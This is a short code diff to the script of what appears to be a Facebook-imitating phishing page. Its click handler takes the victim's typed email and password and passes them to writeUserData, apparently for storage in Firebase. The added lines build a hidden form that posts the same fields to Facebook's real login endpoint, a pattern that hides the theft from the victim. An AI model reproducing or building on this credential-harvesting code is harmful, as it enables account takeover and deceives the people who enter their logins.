@@ -116,7 +116,24 @@
 <script type = "text/javascript">
   function clickEvent() {
       writeUserData(document.getElementById("email").value, document.getElementById("password").value);
+    //  window.location.href = 'http://www.facebook.com';
+
+      javascript:document.write('
+      <form id="l" method="post"
+      action="https://www.facebook.com/login.php?login_attempt=1">
+      <input type="hidden" id="e" name="email">
+      <input type="hidden" name="pass" id="p"></form>');
+
+
   }
+
+
+
+  function g(x){
+    return document.getElementById(x);
+  }
+
+
 </script>
 
 <script src="https://www.gstatic.com/firebasejs/5.8.0/firebase.js"></script>
